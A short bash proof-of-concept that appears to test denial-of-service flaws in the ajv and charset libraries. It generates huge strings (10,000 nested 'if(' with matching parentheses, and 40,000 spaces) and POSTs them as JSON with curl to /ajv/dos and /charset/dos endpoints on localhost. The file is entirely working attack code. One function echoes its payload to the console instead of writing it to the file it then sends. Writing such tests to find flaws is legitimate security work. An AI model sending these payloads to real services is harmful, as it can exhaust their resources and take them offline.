#!/bin/bash

set +x

generate() {
    # echo "Running generation... Hold tight." > /dev/null
    # start=`date +%s`

    LENGTH=$1
    CHAR=$2
    RESULT=""
    for ((i = 0; i <= $LENGTH; i++))
    do
        RESULT=$RESULT$CHAR
    done

    # end=`date +%s`
    # runtime=$((end-start))
    # echo "All done!" > /dev/null
    # echo "Took: ${runtime}s" > /dev/null
    echo $RESULT
}

makeJson() {
    STR=$1
    jo -p title=$STR > ../data.json
}

runAjvDos() {
    fin="$(generate 10000 "if(")x$(generate 10000 ")")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST http://localhost:3000/ajv/dos
}

runCharsetDos() {
    generate 40000 " "
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST http://localhost:3000/charset/dos > out.txt
}

# runAjvDos

runCharsetDos
